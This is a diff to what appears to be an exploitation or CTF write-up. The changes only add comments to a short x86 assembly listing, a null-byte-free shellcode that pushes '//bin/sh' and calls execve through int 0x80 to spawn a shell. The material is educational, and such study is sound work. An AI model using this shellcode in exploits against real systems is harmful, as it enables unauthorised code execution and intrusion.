@@ -83,18 +83,18 @@ The basic plan:
 4. `int 0x80` to call `execve` which would have `ebx` as its first argument.
 
 ```assembly
-; Push //bin/sh on stack (one more slash to avoid null byte)
+; Push "//bin/sh" on stack (one more slash to avoid null byte)
 xor eax, eax
 push eax
 push `n/sh`
 push `//bi`
 
-; Set parameters
+; Set parameters ebx = "//bin/sh", ecx = NULL, edx = NULL
 mov ebx, esp
 xor ecx, ecx
 xor edx, edx
 
-; call execve
+; eax = 11, ebx = "//bin/sh" -> execve("//bin/sh", NULL, NULL)
 mov al, 11
 int 0x80
 
